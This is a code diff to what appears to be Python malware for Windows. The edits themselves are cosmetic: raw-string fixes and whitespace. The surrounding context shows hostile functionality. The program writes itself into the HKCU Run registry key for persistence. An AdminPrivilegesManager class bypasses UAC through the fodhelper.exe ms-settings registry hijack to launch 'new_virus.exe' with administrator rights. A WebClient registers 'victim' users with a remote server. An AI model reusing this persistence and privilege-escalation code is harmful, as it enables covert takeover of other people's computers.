@@ -22,7 +22,7 @@ def add_to_winregistry():
     # key we want to change is HKEY_CURRENT_USER
     # key value is Software\Microsoft\Windows\CurrentVersion\Run
     key = winreg.HKEY_CURRENT_USER
-    key_value = "Software\Microsoft\Windows\CurrentVersion\Run"
+    key_value = r"Software\Microsoft\Windows\CurrentVersion\Run"
 
     # open the key to make changes to
     open = winreg.OpenKey(key, key_value, 0, winreg.KEY_ALL_ACCESS)
@@ -38,13 +38,14 @@ class AdminPrivilegesManager(object):
     """
     This class is responsible for bypassing thr UAC and granting administration permissions to this program.
     """
+
     def __init__(self):
         self.cmd = r"C:\Users\Public\new_virus.exe -r"  # The command to run with administration permissions.
         self.fod_helper = r'C:\Windows\System32\fodhelper.exe'  # The path to fodhelper.exe.
         self.python_cmd = "python"
-        self.reg_path = 'Software\Classes\ms-settings\shell\open\command'   # The registry key to put the command in.
+        self.reg_path = r'Software\Classes\ms-settings\shell\open\command'  # The registry key to put the command in.
         self.delegate_exec_reg_key = 'DelegateExecute'
-        self.old_value = ''   # This will store the value of the operating system's redirection settings.
+        self.old_value = ''  # This will store the value of the operating system's redirection settings.
 
     def disable_file_system_redirection(self):
         """
@@ -113,6 +114,7 @@ class WebClient(object):
     """
     This class is responsible for communicating with the web server.
     """
+
     def __init__(self, username, password):
         # The username to use when creating/logging in a victim's user.
         self.username = username
